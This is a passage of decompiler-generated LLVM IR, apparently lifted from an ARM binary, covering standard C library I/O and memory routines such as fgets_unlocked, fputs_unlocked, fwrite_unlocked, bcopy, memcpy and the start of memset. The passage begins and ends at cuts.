  %v0_c5e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c5e8

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c5bc
  %v0_c5fc = phi i32 [ %v0_c5bc, %dec_label_pc_c5ac ], [ %v0_c5e8.pre, %dec_label_pc_c5bc ]
  %v1_c5e8 = inttoptr i32 %v0_c5fc to i32*
  %v2_c5e8 = load i32, i32* %v1_c5e8, align 4
  %v0_c5ec = load i32, i32* %sl.global-to-local, align 4
  %v2_c5ec = or i32 %v0_c5ec, %v2_c5e8
  %v1_c5f0 = xor i32 %v2_c5ec, 320
  store i32 %v1_c5f0, i32* %r3.global-to-local, align 4
  %v1_c5f4 = and i32 %v1_c5f0, 832
  %v2_c5f4 = icmp eq i32 %v1_c5f4, 0
  store i1 %v2_c5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c5f4, label %dec_label_pc_c5fc, label %bb39

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5e8
  store i32 %v0_c5fc, i32* @r0, align 4
  %v0_c600 = call i32 @__stdio_wcommit()
  store i32 %v0_c600, i32* %r0.global-to-local, align 4
  %v2_c604 = icmp eq i32 %v0_c600, 0
  store i1 %v2_c604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c604, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_c5fc
  %v1_c608 = load i32, i32* @r6, align 4
  %v2_c608 = inttoptr i32 %v1_c608 to i32*
  %v3_c608 = load i32, i32* %v2_c608, align 4
  store i32 %v3_c608, i32* %r3.global-to-local, align 4
  %v2_c60c = add i32 %v1_c608, 8
  %v3_c60c = inttoptr i32 %v2_c60c to i32*
  %v4_c60c = load i32, i32* %v3_c60c, align 4
  %v2_c610 = and i32 %v3_c608, -65
  store i32 %v2_c610, i32* %r3.global-to-local, align 4
  %v4_c614 = sdiv i32 %v3_c608, 256
  store i32 %v4_c614, i32* %r1.global-to-local, align 4
  %v3_c618 = add i32 %v1_c608, 28
  %v4_c618 = inttoptr i32 %v3_c618 to i32*
  store i32 %v4_c60c, i32* %v4_c618, align 4
  %v1_c61c = load i32, i32* %r1.global-to-local, align 4
  %v2_c61c = trunc i32 %v1_c61c to i8
  %v3_c61c = load i32, i32* @r6, align 4
  %v4_c61c = add i32 %v3_c61c, 1
  %v5_c61c = inttoptr i32 %v4_c61c to i8*
  store i8 %v2_c61c, i8* %v5_c61c, align 1
  %v0_c620.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c620.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_c620 = load i32, i32* %r3.global-to-local, align 4
  %v2_c620 = trunc i32 %v1_c620 to i8
  %v3_c620 = load i32, i32* @r6, align 4
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v2_c620, i8* %v4_c620, align 1
  %v0_c624.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c624.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_c5fc, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_c5e8, %.thread6, %.thread7
  %v2_c62c = load i32, i32* @global_var_1e4bc.424, align 4
  store i32 %v2_c62c, i32* %r3.global-to-local, align 4
  %v7_c630 = icmp eq i32 %v2_c62c, 2
  store i1 %v7_c630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c630, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_c4f8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 58724)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_c5a0, %bb40
  %v0_c648 = load i32, i32* @r6, align 4
  %v1_c648 = add i32 %v0_c648, 32
  %v2_c648 = inttoptr i32 %v1_c648 to i32*
  %v3_c648 = load i32, i32* %v2_c648, align 4
  store i32 %v3_c648, i32* @r6, align 4
  %v2_c64c = icmp eq i32 %v3_c648, 0
  store i1 %v2_c64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c64c, label %dec_label_pc_c64c.dec_label_pc_c654_crit_edge, label %dec_label_pc_c5a0

dec_label_pc_c64c.dec_label_pc_c654_crit_edge:    ; preds = %.thread11
  %v0_c654.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c654

dec_label_pc_c654:                                ; preds = %dec_label_pc_c64c.dec_label_pc_c654_crit_edge, %dec_label_pc_c510
  %v0_c654 = phi i32 [ %v0_c654.pre, %dec_label_pc_c64c.dec_label_pc_c654_crit_edge ], [ %v1_c590, %dec_label_pc_c510 ]
  %v1_c654 = call i32 @_stdio_openlist_dec_use(i32 %v0_c654)
  store i32 %v1_c654, i32* %r0.global-to-local, align 4
  %v0_c698.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_c65c:                                ; preds = %dec_label_pc_c504
  %v1_c65c = inttoptr i32 %.v1_c4f0 to i8*
  %v2_c65c = load i8, i8* %v1_c65c, align 1
  %v3_c65c = zext i8 %v2_c65c to i32
  %v1_c660 = and i32 %v3_c65c, 64
  store i32 %v1_c660, i32* %r3.global-to-local, align 4
  %v2_c660 = icmp eq i32 %v1_c660, 0
  store i1 %v2_c660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c660, label %bb41, label %dec_label_pc_c66c

bb41:                                             ; preds = %dec_label_pc_c65c
  br label %bb43

dec_label_pc_c66c:                                ; preds = %dec_label_pc_c65c
  %v0_c66c = call i32 @__stdio_wcommit()
  store i32 %v0_c66c, i32* %r0.global-to-local, align 4
  %v2_c670 = icmp eq i32 %v0_c66c, 0
  store i1 %v2_c670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c670, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_c66c
  %v1_c674 = load i32, i32* %r8.global-to-local, align 4
  %v2_c674 = inttoptr i32 %v1_c674 to i32*
  %v3_c674 = load i32, i32* %v2_c674, align 4
  store i32 %v3_c674, i32* %r3.global-to-local, align 4
  %v2_c678 = add i32 %v1_c674, 8
  %v3_c678 = inttoptr i32 %v2_c678 to i32*
  %v4_c678 = load i32, i32* %v3_c678, align 4
  store i32 %v4_c678, i32* %r1.global-to-local, align 4
  %v2_c67c = and i32 %v3_c674, -65
  store i32 %v2_c67c, i32* %r3.global-to-local, align 4
  %v4_c680 = sdiv i32 %v3_c674, 256
  %v2_c684 = trunc i32 %v4_c680 to i8
  %v4_c684 = add i32 %v1_c674, 1
  %v5_c684 = inttoptr i32 %v4_c684 to i8*
  store i8 %v2_c684, i8* %v5_c684, align 1
  %v0_c688.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c688.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_c688 = load i32, i32* %r1.global-to-local, align 4
  %v2_c688 = load i32, i32* %r8.global-to-local, align 4
  %v3_c688 = add i32 %v2_c688, 28
  %v4_c688 = inttoptr i32 %v3_c688 to i32*
  store i32 %v1_c688, i32* %v4_c688, align 4
  %v1_c68c = load i32, i32* %r3.global-to-local, align 4
  %v2_c68c = trunc i32 %v1_c68c to i8
  %v3_c68c = load i32, i32* %r8.global-to-local, align 4
  %v4_c68c = inttoptr i32 %v3_c68c to i8*
  store i8 %v2_c68c, i8* %v4_c68c, align 1
  %v0_c690.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c690.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_c66c
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_c654, %.thread20
  %v0_c698 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_c698.pre, %dec_label_pc_c654 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_c698, i32* %r0.global-to-local, align 4
  store i32 %v3_c4e4, i32* @r4, align 4
  ret i32 %v0_c698

; uselistorder directives
  uselistorder i32 %v0_c698, { 1, 0 }
  uselistorder i32 %v3_c648, { 1, 2, 0 }
  uselistorder i32 %v2_c4f8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 11, 4, 6, 5, 7, 8, 9, 10, 14, 12, 13 }
  uselistorder i32* bitcast (i32** @global_var_1e488.433 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_1ec04.411, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c5e8, { 1, 0 }
  uselistorder label %dec_label_pc_c5a0, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_c6cc = icmp eq i32 %arg2, 0
  store i1 %v2_c6cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_c754, label %dec_label_pc_c738.preheader

dec_label_pc_c738.preheader:                      ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_c73815 = add i32 %arg2, -1
  store i32 %v1_c73815, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_c73821 = icmp eq i32 %arg2, 1
  store i1 %v7_c73821, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c73821, label %dec_label_pc_c744, label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c738.preheader, %dec_label_pc_c738.backedge
  %v1_c73c24.in = phi i32 [ %v0_c73c.pre, %dec_label_pc_c738.backedge ], [ %arg3, %dec_label_pc_c738.preheader ]
  %v1_c6e4 = add i32 %v1_c73c24.in, 16
  %v2_c6e4 = inttoptr i32 %v1_c6e4 to i32*
  %v3_c6e4 = load i32, i32* %v2_c6e4, align 4
  store i32 %v3_c6e4, i32* %r2.global-to-local, align 4
  %v1_c6e8 = add i32 %v1_c73c24.in, 24
  %v2_c6e8 = inttoptr i32 %v1_c6e8 to i32*
  %v3_c6e8 = load i32, i32* %v2_c6e8, align 4
  %v3_c6ec = icmp uge i32 %v3_c6e4, %v3_c6e8
  store i1 %v3_c6ec, i1* %cpsr_c.global-to-local, align 1
  %v9_c6ec = icmp eq i32 %v3_c6e4, %v3_c6e8
  store i1 %v9_c6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6ec, label %dec_label_pc_c70c, label %dec_label_pc_c6f4

dec_label_pc_c6f4:                                ; preds = %dec_label_pc_c6e4
  %v1_c6f4 = inttoptr i32 %v3_c6e4 to i8*
  %v2_c6f4 = load i8, i8* %v1_c6f4, align 1
  %v5_c6f4 = add i32 %v3_c6e4, 1
  store i32 %v5_c6f4, i32* %r2.global-to-local, align 4
  %v2_c6f8 = load i32, i32* @r4, align 4
  %v3_c6f8 = inttoptr i32 %v2_c6f8 to i8*
  store i8 %v2_c6f4, i8* %v3_c6f8, align 1
  %v0_c6fc = load i32, i32* @r4, align 4
  %v1_c6fc = inttoptr i32 %v0_c6fc to i8*
  %v2_c6fc = load i8, i8* %v1_c6fc, align 1
  %v5_c6fc = add i32 %v0_c6fc, 1
  store i32 %v5_c6fc, i32* @r4, align 4
  %v2_c700 = icmp ugt i8 %v2_c6fc, 9
  store i1 %v2_c700, i1* %cpsr_c.global-to-local, align 1
  %v7_c700 = icmp eq i8 %v2_c6fc, 10
  store i1 %v7_c700, i1* %cpsr_z.global-to-local, align 1
  %v0_c704 = load i32, i32* %r2.global-to-local, align 4
  %v1_c704 = load i32, i32* @r5, align 4
  %v2_c704 = add i32 %v1_c704, 16
  %v3_c704 = inttoptr i32 %v2_c704 to i32*
  store i32 %v0_c704, i32* %v3_c704, align 4
  br i1 %v7_c700, label %dec_label_pc_c744, label %dec_label_pc_c738.backedge

dec_label_pc_c70c:                                ; preds = %dec_label_pc_c6e4
  %v1_c73c24 = inttoptr i32 %v1_c73c24.in to i8*
  %v3_c70c = call i32 @getc_unlocked(i8* %v1_c73c24)
  %v4_c70c = trunc i32 %v3_c70c to i8
  %v5_c710 = icmp eq i8 %v4_c70c, -1
  store i1 %v5_c710, i1* %cpsr_c.global-to-local, align 1
  %v10_c710 = icmp eq i32 %v3_c70c, -1
  store i1 %v10_c710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_c710, label %dec_label_pc_c718, label %dec_label_pc_c734

dec_label_pc_c718:                                ; preds = %dec_label_pc_c70c
  %v0_c718 = load i32, i32* @r5, align 4
  %v1_c718 = inttoptr i32 %v0_c718 to i8*
  %v2_c718 = load i8, i8* %v1_c718, align 1
  %v1_c71c = and i8 %v2_c718, 8
  %v2_c71c = icmp eq i8 %v1_c71c, 0
  store i1 %v2_c71c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c71c, label %dec_label_pc_c744, label %dec_label_pc_c754

dec_label_pc_c734:                                ; preds = %dec_label_pc_c70c
  %v3_c728 = load i32, i32* @r4, align 4
  %v4_c728 = inttoptr i32 %v3_c728 to i8*
  store i8 %v4_c70c, i8* %v4_c728, align 1
  %v0_c72c = load i32, i32* @r4, align 4
  %v1_c72c = inttoptr i32 %v0_c72c to i8*
  %v2_c72c = load i8, i8* %v1_c72c, align 1
  %v5_c72c = add i32 %v0_c72c, 1
  store i32 %v5_c72c, i32* @r4, align 4
  %v2_c730 = icmp ugt i8 %v2_c72c, 9
  store i1 %v2_c730, i1* %cpsr_c.global-to-local, align 1
  %v7_c730 = icmp eq i8 %v2_c72c, 10
  store i1 %v7_c730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c730, label %dec_label_pc_c744, label %dec_label_pc_c738.backedge

dec_label_pc_c738.backedge:                       ; preds = %dec_label_pc_c734, %dec_label_pc_c6f4
  %v0_c738.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_c73c.pre = load i32, i32* @r5, align 4
  %v1_c738 = add i32 %v0_c738.pre, -1
  store i32 %v1_c738, i32* %r6.global-to-local, align 4
  %v2_c738 = icmp ne i32 %v0_c738.pre, 0
  store i1 %v2_c738, i1* %cpsr_c.global-to-local, align 1
  %v7_c738 = icmp eq i32 %v0_c738.pre, 1
  store i1 %v7_c738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c738, label %dec_label_pc_c744, label %dec_label_pc_c6e4

dec_label_pc_c744:                                ; preds = %dec_label_pc_c738.preheader, %dec_label_pc_c734, %dec_label_pc_c738.backedge, %dec_label_pc_c6f4, %dec_label_pc_c718
  %v0_c744 = load i32, i32* @r4, align 4
  %v1_c744 = load i32, i32* %r7.global-to-local, align 4
  %v3_c744 = icmp uge i32 %v0_c744, %v1_c744
  store i1 %v3_c744, i1* %cpsr_c.global-to-local, align 1
  %v9_c744 = icmp eq i32 %v0_c744, %v1_c744
  store i1 %v9_c744, i1* %cpsr_z.global-to-local, align 1
  %v2_c748 = xor i1 %v9_c744, true
  %v3_c748 = and i1 %v3_c744, %v2_c748
  br i1 %v3_c748, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_c744
  %v7_c74c = inttoptr i32 %v0_c744 to i8*
  store i8 0, i8* %v7_c74c, align 1
  %v0_c750.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_c750.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_c744, %bb
  %v1_c750 = phi i1 [ %v1_c750.pre, %bb ], [ %v9_c744, %dec_label_pc_c744 ]
  %v0_c750 = phi i1 [ %v0_c750.pre, %bb ], [ %v3_c744, %dec_label_pc_c744 ]
  %v2_c750 = xor i1 %v1_c750, true
  %v3_c750 = and i1 %v0_c750, %v2_c750
  br i1 %v3_c750, label %.dec_label_pc_c758_crit_edge, label %dec_label_pc_c754

.dec_label_pc_c758_crit_edge:                     ; preds = %.thread7
  %v0_c758.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c758

dec_label_pc_c754:                                ; preds = %entry, %dec_label_pc_c718, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %.dec_label_pc_c758_crit_edge, %dec_label_pc_c754
  %v0_c758 = phi i32 [ %v0_c758.pre, %.dec_label_pc_c758_crit_edge ], [ 0, %dec_label_pc_c754 ]
  ret i32 %v0_c758

; uselistorder directives
  uselistorder i1 %v9_c744, { 1, 0, 2 }
  uselistorder i32 %v1_c744, { 1, 0 }
  uselistorder i32 %v0_c744, { 0, 2, 1 }
  uselistorder i32 %v0_c738.pre, { 2, 0, 1 }
  uselistorder i1 %v2_c71c, { 1, 0 }
  uselistorder i32 %v3_c6e4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_c73c24.in, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 4, 8, 9, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 3, 7, 0, 1, 2, 8, 4 }
  uselistorder label %dec_label_pc_c758, { 1, 0 }
  uselistorder label %dec_label_pc_c754, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_c744, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_c760 = load i32, i32* @r4, align 4
  store i32 %v3_c760, i32* %stack_var_-16, align 4
  %v6_c760 = load i32, i32* @r5, align 4
  %v9_c760 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_c76c = call i32 @strlen(i8* %arg1)
  store i32 %v3_c76c, i32* @r6, align 4
  %v0_c774 = load i32, i32* @r5, align 4
  %v0_c778 = load i32, i32* @r4, align 4
  %v5_c784 = inttoptr i32 %v0_c774 to i8*
  %v6_c784 = call i32 @__GI_fwrite_unlocked(i32 %v0_c778, i32 1, i32 %v3_c76c, i8* %v5_c784)
  %v1_c788 = load i32, i32* @r6, align 4
  %v9_c788 = icmp eq i32 %v6_c784, %v1_c788
  br i1 %v9_c788, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_c790 = phi i32 [ %v6_c784, %entry ], [ -1, %bb ]
  %v2_c790 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c790, i32* @r4, align 4
  store i32 %v6_c760, i32* @r5, align 4
  store i32 %v9_c760, i32* @r6, align 4
  ret i32 %v14_c790

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_c794 = load i32, i32* @r6, align 4
  %v12_c794 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_c79c = load i8, i8* %arg4, align 1
  %v4_c79c = zext i8 %v3_c79c to i32
  %v1_c7a0 = and i32 %v4_c79c, 192
  store i32 %v1_c7a0, i32* %r3.global-to-local, align 4
  %v2_c7a4 = icmp eq i32 %v1_c7a0, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_c7a4, label %dec_label_pc_c7cc, label %dec_label_pc_c7c0

dec_label_pc_c7c0:                                ; preds = %entry
  %v4_c7c0 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_c7c4 = icmp eq i32 %v4_c7c0, 0
  br i1 %v2_c7c4, label %dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge, label %dec_label_pc_c834

dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge:    ; preds = %dec_label_pc_c7c0
  %v0_c7cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c7cc

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge, %entry
  %v0_c7d41 = phi i32 [ %v0_c7cc.pre, %dec_label_pc_c7c0.dec_label_pc_c7cc_crit_edge ], [ %arg2, %entry ]
  %v2_c7cc = icmp eq i32 %v0_c7d41, 0
  br i1 %v2_c7cc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_c7cc
  br label %dec_label_pc_c834

bb:                                               ; preds = %dec_label_pc_c7cc
  %v1_c7d0 = load i32, i32* @r6, align 4
  %v3_c7d0 = icmp eq i32 %v1_c7d0, 0
  br i1 %v3_c7d0, label %dec_label_pc_c834, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %bb
  %v2_c7e0 = udiv i32 -1, %v0_c7d41
  %v0_c7e8 = load i32, i32* @r4, align 4
  store i32 %v0_c7e8, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_c7d0, %v2_c7e0
  br i1 %tmp10, label %dec_label_pc_c80c, label %dec_label_pc_c7f4

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0
  %v0_c7ec = load i32, i32* @r7, align 4
  %v2_c7f4 = mul i32 %v1_c7d0, %v0_c7d41
  %v4_c7f8 = call i32 @__stdio_fwrite(i32 %v0_c7ec, i32 %v2_c7f4, i32 %v0_c7e8)
  %v0_c7fc = load i32, i32* @r5, align 4
  %v2_c800 = udiv i32 %v4_c7f8, %v0_c7fc
  store i32 %v2_c800, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c80c:                                ; preds = %dec_label_pc_c7e0
  %v1_c80c = inttoptr i32 %v0_c7e8 to i32*
  %v2_c80c = load i32, i32* %v1_c80c, align 4
  %v1_c810 = or i32 %v2_c80c, 8
  store i32 %v1_c810, i32* %r3.global-to-local, align 4
  %v3_c814 = sdiv i32 %v2_c80c, 256
  store i32 %v3_c814, i32* %r2.global-to-local, align 4
  %v1_c818 = trunc i32 %v3_c814 to i8
  %v3_c818 = add i32 %v0_c7e8, 1
  %v4_c818 = inttoptr i32 %v3_c818 to i8*
  store i8 %v1_c818, i8* %v4_c818, align 1
  %v0_c81c = load i32, i32* %r3.global-to-local, align 4
  %v1_c81c = trunc i32 %v0_c81c to i8
  %v2_c81c = load i32, i32* @r4, align 4
  %v3_c81c = inttoptr i32 %v2_c81c to i8*
  store i8 %v1_c81c, i8* %v3_c81c, align 1
  %v0_c820 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c82c = inttoptr i32 %v0_c820 to i32*
  store i32 22, i32* %v2_c82c, align 4
  %v0_c838.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c834:                                ; preds = %.thread, %dec_label_pc_c7c0, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c80c, %dec_label_pc_c7f4, %dec_label_pc_c834
  %v0_c838 = phi i32 [ %v0_c838.pre, %dec_label_pc_c80c ], [ %v2_c800, %dec_label_pc_c7f4 ], [ 0, %dec_label_pc_c834 ]
  store i32 %v9_c794, i32* @r6, align 4
  store i32 %v12_c794, i32* @r7, align 4
  ret i32 %v0_c838

; uselistorder directives
  uselistorder i32 %v3_c814, { 1, 0 }
  uselistorder i32 %v1_c7d0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_c838, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c834, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_c84c = inttoptr i32 %arg2 to i8*
  %v3_c84c = call i32 @_memcpy(i8* %v2_c84c, i32 %arg1)
  ret i32 %v3_c84c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_c850 = load i32, i32* @r0, align 4
  %v1_c850 = load i32, i32* @r1, align 4
  %v2_c850 = inttoptr i32 %v0_c850 to i8*
  %v3_c850 = call i32 @_memcpy(i8* %v2_c850, i32 %v1_c850)
  ret i32 %v3_c850
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_c864 = load i32, i32* @r2, align 4
  %v8_c864 = icmp eq i32 %v0_c864, 8
  store i1 %v8_c864, i1* %cpsr_z.global-to-local, align 1
  %v5_c868 = icmp slt i32 %v0_c864, 8
  br i1 %v5_c868, label %dec_label_pc_c8c8, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %entry
  %v4_c86c = mul i32 %arg2, 256
  %v5_c86c = or i32 %v4_c86c, %arg2
  %v4_c870 = mul i32 %v5_c86c, 65536
  %v5_c870 = or i32 %v4_c870, %v5_c86c
  store i32 %v5_c870, i32* %r1.global-to-local, align 4
  %v1_c87457 = urem i32 %tmp, 4
  %v2_c87458 = icmp eq i32 %v1_c87457, 0
  store i1 %v2_c87458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_c87458, label %dec_label_pc_c884, label %bb

bb:                                               ; preds = %dec_label_pc_c86c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_c86c ]
  %v3_c87859 = phi i32 [ %v6_c878, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_c86c ]
  %v4_c878 = inttoptr i32 %v3_c87859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_c878, align 1
  %v5_c878 = load i32, i32* %r3.global-to-local, align 4
  %v6_c878 = add i32 %v5_c878, 1
  store i32 %v6_c878, i32* %r3.global-to-local, align 4
  %v0_c87c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_c888.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_c87c.pr, label %dec_label_pc_c884, label %.thread

.thread:                                          ; preds = %bb
  %v2_c87c = add i32 %v0_c888.pr.pre, -1
  store i32 %v2_c87c, i32* @r2, align 4
  %v1_c874 = urem i32 %v6_c878, 4
  %v2_c874 = icmp eq i32 %v1_c874, 0
  store i1 %v2_c874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c874, label %dec_label_pc_c884, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_c878.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_c878.pre to i8
  br label %bb

dec_label_pc_c884:                                ; preds = %.thread, %bb, %dec_label_pc_c86c
  %v0_c89028 = phi i32 [ %tmp, %dec_label_pc_c86c ], [ %v6_c878, %bb ], [ %v6_c878, %.thread ]
  %v0_c888.pr = phi i32 [ %v0_c864, %dec_label_pc_c86c ], [ %v0_c888.pr.pre, %bb ], [ %v2_c87c, %.thread ]
  %v0_c884 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_c884, i32* @ip, align 4
  %v8_c88810 = icmp eq i32 %v0_c888.pr, 8
  store i1 %v8_c88810, i1* %cpsr_z.global-to-local, align 1
  %v5_c88c11 = icmp slt i32 %v0_c888.pr, 8
